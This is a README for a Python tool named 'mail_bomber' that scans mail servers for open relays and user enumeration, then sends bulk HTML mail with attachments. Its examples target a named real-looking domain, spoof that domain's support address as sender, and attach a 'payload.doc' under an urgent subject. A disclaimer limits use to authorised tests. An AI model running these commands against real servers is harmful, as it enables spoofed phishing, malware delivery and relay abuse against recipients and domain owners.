# mail_bomber

Python-скрипт для массовой рассылки email и **SMTP scan** misconfig/open-relay. Keep-alive, HTML-шаблоны, вложения (doc, pdf, zip). Поддержка SSL (465), STARTTLS (587), plain relay на `:25` (как `swaks` без `--tls`), MX fallback, переподключение при обрывах.

## Возможности

### Рассылка

- **Keep-alive** — NOOP-пинги во время задержки между письмами
- **Порты** — `465` (SMTPS), `587` (STARTTLS по умолчанию), `25` (plain без STARTTLS по умолчанию)
- **Open-relay** — отправка без `-u`/`-p`, режим как у swaks на `:25`
- **TLS** — `--starttls` / `--no-starttls`
- **MX fallback** — при `connection refused` на apex пробуются MX и `mail.<домен>` (нужен `dig`)

### SMTP scan (`--scan`)

Отдельный режим: **не шлёт письма**, проверяет типичные уязвимые сценарии до этапа `RCPT TO` (без `DATA`).

- Скан портов **25 / 465 / 587 / 2525** (или один порт, если указан `host:port`)
- **EHLO** — banner, `STARTTLS`, `AUTH`
- **VRFY / EXPN** — user enumeration
- **Open-relay** (plain и STARTTLS):
  - внешний `MAIL FROM` → локальный RCPT (`-e`)
  - локальный `From` → внешний RCPT (`@example.com`)
  - произвольный foreign `From` → локальный RCPT
  - `MAIL FROM:<>`
- **587** — submission plain / STARTTLS без auth (если порт открыт)
- Итоговый отчёт со списком находок

## Usage — рассылка

```
usage: mail_bomber.py [-h] [--scan HOST] [-e EMAILS] [-d DELAY]
                      [-s SMTP_SERVER] [--port PORT] [--starttls | --no-starttls]
                      [-u USER] [-p PASSWORD] [-f MAIL_FROM] [-t TEMPLATE]
                      [--subject SUBJECT] [-a ATTACHMENTS]

  -e, --emails          Файл с адресами получателей
  -d, --delay           Задержка между письмами (сек)
  -s, --smtp-server     SMTP host или host:port
  --port                Порт, если не в -s
  --starttls / --no-starttls
  -f, --mail-from       Отправитель
  -t, --template        HTML шаблон
  -a, --attach          Вложение (несколько раз)
```

## Usage — scan

```
  --scan HOST           Цель: домен, mail.host или host:port
  -e PROBE@domain       Один probe email (получатель в зоне цели), не файл!
```

Пример:

```bash
python3 mail_bomber.py --scan mkkfinpost.ru -e info@mkkfinpost.ru
python3 mail_bomber.py --scan mail.mkkfinpost.ru:25 -e info@mkkfinpost.ru
```

Фрагмент вывода:

```
[*] SMTP scan: цель mkkfinpost.ru, probe RCPT info@mkkfinpost.ru
[+] mail.mkkfinpost.ru:25 — порт открыт
[~] mail.mkkfinpost.ru:25 STARTTLS advertised
[!] Open relay (plain): произвольный From@foreign -> локальный RCPT: ... принят
╔══════════════════════════════════════╗
║           ИТОГИ SMTP SCAN            ║
╚══════════════════════════════════════╝
```

После scan — рассылка через тот же хост:

```bash
python3 mail_bomber.py -e mail.txt -d 3 -s mkkfinpost.ru:25 \
  -f support@mkkfinpost.ru -t template.html --subject "Тема"
```

## Примеры рассылки

### IP / lab (порт 25)

```bash
python3 mail_bomber.py -e emails.txt -d 3 -s 10.124.5.11:25 \
  -f agent@x.stf -t letter.html -a payload.doc --subject "Важная информация"
```

### Домен с MX (apex → `mail.` / MX)

```bash
python3 mail_bomber.py -e mail.txt -d 3 -s mkkfinpost.ru:25 \
  -f support@mkkfinpost.ru -t template.html --subject "Важная информация"
```

### Эквивалент swaks (plain, без auth)

```bash
swaks --to user@domain --from sender@domain --server mail.domain --port 25
```

```bash
python3 mail_bomber.py -e list.txt -d 3 -s mail.domain:25 \
  -f sender@domain -t tpl.html --no-starttls
```

## Зависимости

- Python 3
- `dig` (bind9-dnsutils) — MX fallback и scan по домену

## Disclaimer

Только с явным разрешением (CTF, lab, pentest in scope). Несанкционированная рассылка и злоупотребление open-relay незаконны.
